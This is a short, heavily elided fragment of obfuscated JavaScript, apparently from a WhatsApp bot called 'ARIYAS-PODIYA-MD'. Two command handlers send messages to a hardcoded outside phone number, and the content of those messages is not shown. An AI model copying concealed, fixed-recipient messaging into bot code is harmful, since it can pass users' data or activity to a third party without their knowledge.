...
cmd(_0x4e3f12, async (_0x52a0ca, _0x38f31b, _0x4a8087, {
  ...
  try {
    ...
    _0x52a0ca.sendMessage("94766002356@s.whatsapp.net", {
...
cmd(_0x3f5f6b, async (_0x2b57d7, _0x2ac2c0, _0x4498dd, {
  ...
  try {
    ...
    await _0x2b57d7.sendMessage("94766002356@s.whatsapp.net", {
    ...
    if (config.MODE === "nonbutton") {
      const _0x47a84e = [{
        ...
        'rows': [{
          ...
          'description': "𝗔𝗥𝗜𝗬𝗔𝗦-𝗣𝗢𝗗𝗜𝗬𝗔-𝗠𝗗- SPEED"
        }]
      }];
      const _0xc7cb04 = {
        url: config.LOGO
